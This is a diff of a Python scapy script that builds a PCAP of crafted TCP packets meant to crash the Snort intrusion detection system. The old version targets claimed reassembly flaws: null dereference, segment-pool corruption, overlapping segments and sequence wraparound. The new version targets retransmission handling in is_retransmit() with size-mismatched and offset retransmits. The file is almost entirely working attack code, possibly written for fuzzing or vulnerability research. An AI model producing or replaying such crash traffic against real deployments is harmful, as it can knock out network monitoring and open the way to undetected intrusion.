@@ -1,11 +1,11 @@
 #!/usr/bin/env python3
 from scapy.all import *
 import random
-import struct
+import os
 
 # Set up the IP addresses and ports
 src_ip = "192.168.1.100"
-dst_ip = "192.168.1.200"
+dst_ip = "192.168.1.200" 
 src_port = 12345
 dst_port = 80
 
@@ -13,123 +13,108 @@ dst_port = 80
 client_isn = random.randint(1000000000, 2000000000)
 server_isn = random.randint(1000000000, 2000000000)
 
-# Create the packets
 packets = []
 
 # TCP 3-way handshake
-# SYN
 syn = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="S", seq=client_isn)
 packets.append(syn)
 
-# SYN-ACK
 syn_ack = IP(src=dst_ip, dst=src_ip)/TCP(sport=dst_port, dport=src_port, flags="SA", 
              seq=server_isn, ack=client_isn+1)
 packets.append(syn_ack)
 
-# ACK
 ack = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="A", 
          seq=client_isn+1, ack=server_isn+1)
 packets.append(ack)
 
-# --------- VULNERABILITY #1: NULL POINTER DEREFERENCE IN flush_data_segments() ----------
-# Key issue: The code assumes seglist.cur_rseg is non-null in many places
-
-# First, send some normal data
+# Base sequence for data
 base_seq = client_isn + 1
-pkt1 = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="PA", 
-         seq=base_seq, ack=server_isn+1)/Raw(load=b"A"*100)
-packets.append(pkt1)
+current_seq = base_seq
+
+# We'll focus on retransmission attacks since the vulnerability is related to how
+# retransmitted packets are handled in is_retransmit() function
+
+# Create a large initial segment (baseline)
+payload_size = 1460  # TCP MSS
+payload = os.urandom(payload_size)  # Random data
+pkt = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="PA", 
+        seq=current_seq, ack=server_isn+1)/Raw(load=payload)
+packets.append(pkt)
 
 # Server ACK
 ack1 = IP(src=dst_ip, dst=src_ip)/TCP(sport=dst_port, dport=src_port, flags="A", 
-         seq=server_isn+1, ack=base_seq+100)
+        seq=server_isn+1, ack=current_seq+payload_size)
 packets.append(ack1)
+current_seq += payload_size
 
-# Now create a series of out-of-order segments with a gap
-# This targets logic in tcp_reassembler.cc that handles gaps
+# Now create retransmissions with manipulated sizes to target the memcmp vulnerability
+# We'll create a sequence of retransmits with carefully crafted sizes to potentially
+# trigger the vulnerability in is_retransmit()
 
-# Send segment that will be after the gap (high sequence number)
-high_seq = base_seq + 1000
-pkt2 = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="PA", 
-         seq=high_seq, ack=server_isn+1)/Raw(load=b"B"*100)
-packets.append(pkt2)
-
-# Send segment right before the gap (this forces Snort to process segments in specific order)
-pre_gap_seq = base_seq + 100
-pkt3 = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="PA", 
-         seq=pre_gap_seq, ack=server_isn+1)/Raw(load=b"C"*100)
-packets.append(pkt3)
-
-# Server ACKs these segments (potentially triggering reassembly)
-ack2 = IP(src=dst_ip, dst=src_ip)/TCP(sport=dst_port, dport=src_port, flags="A", 
-         seq=server_isn+1, ack=high_seq+100)
-packets.append(ack2)
-
-# --------- VULNERABILITY #2: MEMORY CORRUPTION IN TcpSegmentNode POOLING ----------
-# In tcp_segment_node.cc, there's a memory pool for segments with sizes between 
-# res_min (1024) and res_max (1460)
-
-# Generate segments with sizes that will exercise the pool logic
-for i in range(50):
-    # Create payload right at the boundaries
-    size = random.choice([1023, 1024, 1460, 1461])  # Just below min, min, max, just above max
+for i in range(1, 20):  # Try several iterations
+    # Original packet with specific sequence
+    seq_num = current_seq
+    orig_size = 1400 + i  # Size that will be just under the MSS
+    orig_payload = os.urandom(orig_size)
     
-    seq_num = high_seq + 100 + i*1500
-    pkt = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="PA", 
-             seq=seq_num, ack=server_isn+1)/Raw(load=b"X"*size)
-    packets.append(pkt)
+    pkt_orig = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="PA", 
+              seq=seq_num, ack=server_isn+1)/Raw(load=orig_payload)
+    packets.append(pkt_orig)
     
     # Server ACK
-    ack = IP(src=dst_ip, dst=src_ip)/TCP(sport=dst_port, dport=src_port, flags="A", 
-             seq=server_isn+1, ack=seq_num+size)
-    packets.append(ack)
-
-# --------- VULNERABILITY #3: EXCESSIVE OVERLAPPING SEGMENTS ----------
-# The tcp_reassembler.cc code has issues when handling many overlapping segments
-
-overlap_base = high_seq + 100000
-overlap_size = 200
-
-# Create a base segment
-pkt_base = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="PA", 
-              seq=overlap_base, ack=server_isn+1)/Raw(load=b"Z"*overlap_size)
-packets.append(pkt_base)
-
-# Now create many overlapping segments with varying degrees of overlap
-for i in range(200):  # Create many overlapping segments
-    # Vary the starting point within the original segment
-    offset = i % overlap_size
-    # Create different payload to force reassembly decisions
-    payload = struct.pack("B", i % 256) * (overlap_size - offset)
+    ack_orig = IP(src=dst_ip, dst=src_ip)/TCP(sport=dst_port, dport=src_port, flags="A", 
+              seq=server_isn+1, ack=seq_num+orig_size)
+    packets.append(ack_orig)
     
-    pkt = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="PA", 
-             seq=overlap_base+offset, ack=server_isn+1)/Raw(load=payload)
-    packets.append(pkt)
+    # Now send what appears to be retransmissions but with manipulated sizes
+    # This targets the comparison logic in is_retransmit()
+    
+    # Case 1: Same sequence but smaller size (targets the cmp_len calculation)
+    retrans_size1 = orig_size - 5
+    retrans_payload1 = orig_payload[:retrans_size1]  # Use part of the original payload
+    
+    pkt_retrans1 = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="PA", 
+                   seq=seq_num, ack=server_isn+1)/Raw(load=retrans_payload1)
+    packets.append(pkt_retrans1)
+    
+    # Case 2: Same sequence but larger size (potentially overflows buffer)
+    retrans_size2 = orig_size + 10
+    # Start with original payload and add more data
+    retrans_payload2 = orig_payload + os.urandom(10)
+    
+    pkt_retrans2 = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="PA", 
+                   seq=seq_num, ack=server_isn+1)/Raw(load=retrans_payload2)
+    packets.append(pkt_retrans2)
+    
+    # Case 3: Slightly offset sequence for edge cases in sequence comparison
+    offset_seq = seq_num + 1
+    pkt_retrans3 = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="PA", 
+                   seq=offset_seq, ack=server_isn+1)/Raw(load=retrans_payload1)
+    packets.append(pkt_retrans3)
+    
+    # Move to next segment
+    current_seq += orig_size
 
-# --------- VULNERABILITY #4: INTEGER OVERFLOW IN SEQUENCE NUMBER HANDLING ----------
-# Create packets with sequence numbers that might cause integer overflow issues
+# Create out-of-order segments to further complicate reassembly
+for i in range(10):
+    # Use random positioning within our established sequence range
+    rand_seq = base_seq + random.randint(0, current_seq - base_seq)
+    rand_size = random.randint(100, 1400)
+    rand_payload = os.urandom(rand_size)
+    
+    pkt_random = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="PA", 
+                 seq=rand_seq, ack=server_isn+1)/Raw(load=rand_payload)
+    packets.append(pkt_random)
 
-# Calculate a sequence number near the 32-bit boundary
-near_wrap_seq = 0xFFFFFFFF - 1000
-pkt_wrap1 = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="PA", 
-              seq=near_wrap_seq, ack=server_isn+1)/Raw(load=b"W"*100)
-packets.append(pkt_wrap1)
-
-# Create a packet just past the wrap boundary
-wrap_seq2 = 10  # This will be after the wrap
-pkt_wrap2 = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="PA", 
-              seq=wrap_seq2, ack=server_isn+1)/Raw(load=b"W"*100)
-packets.append(pkt_wrap2)
-
-# End the connection with a FIN
+# End with a FIN to close connection
 fin = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="FA", 
-         seq=base_seq+5000, ack=server_isn+1)
+         seq=current_seq, ack=server_isn+1)
 packets.append(fin)
 
 fin_ack = IP(src=dst_ip, dst=src_ip)/TCP(sport=dst_port, dport=src_port, flags="FA", 
-             seq=server_isn+1, ack=base_seq+5001)
+             seq=server_isn+1, ack=current_seq+1)
 packets.append(fin_ack)
 
-# Write the packets to a PCAP file
-wrpcap("snort_tcp_crash.pcap", packets)
+# Write to PCAP
+wrpcap("snort_tcp_retransmit_crash.pcap", packets)
 print(f"Created PCAP with {len(packets)} packets")
